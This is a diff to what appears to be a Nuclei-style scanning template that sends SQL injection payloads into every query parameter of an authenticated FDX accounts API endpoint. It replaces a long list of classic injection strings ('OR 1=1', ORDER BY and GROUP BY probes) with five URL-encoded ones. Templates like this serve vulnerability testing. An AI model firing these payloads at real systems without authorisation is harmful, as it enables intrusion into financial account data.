@@ -14,37 +14,17 @@ info:
 requests:
   - raw:
       - |
-        GET /fdx/v4/accounts?accountIds={{url_encode(§sqli§)}}&startTime={{url_encode(§sqli§)}}&endTime={{url_encode(§sqli§)}}&resultType=lightweight&offset={{url_encode(§sqli§)}}&limit={{url_encode(§sqli§)}} HTTP/1.1
+        GET /fdx/v4/accounts?accountIds=§sqli§&startTime=§sqli§&endTime=§sqli§&resultType=lightweight&offset=§sqli§&limit=§sqli§ HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{JWT}} 
         Connection: keep-alive
     payloads:
       sqli:
-         - " 1 or 1"
-         - " %22%22|0;#"
-         - " ''"
-         - " ' or#"
-         - " ' OR '1"
-         - " ' OR 1 -- -"
-         - " %22 OR 1 = 1 -- -#"
-         - " %22%22|0;#"
-         - " OR 1=1"
-         - " AND 1"
-         - " AND 0"
-         - " AND true"
-         - " AND false"
-         - " 1-false"
-         - " 1-true"
-         - " 1*56"
-         - " -2"
-         - " 1' ORDER BY 1--+"
-         - " 1' ORDER BY 2--+"
-         - " 1' ORDER BY 3--+"
-         - " 1' ORDER BY 1,2--+"
-         - " 1' ORDER BY 1,2,3--+"
-         - " 1' GROUP BY 1,2,--+"
-         - " 1' GROUP BY 1,2,3--+"
-         - " ' GROUP BY columnnames having 1=1 --"
+         - "%201%20or%201"
+         - "%20%20%2522%2522%7C0%3B%23"
+         - "%20%27%27"
+         - "%20%2522%20OR%201%20%3D%201%20--%20-%23"
+         - "%201%27%20ORDER%20BY%201--%2B"
     attack: batteringram
 
     extractors:
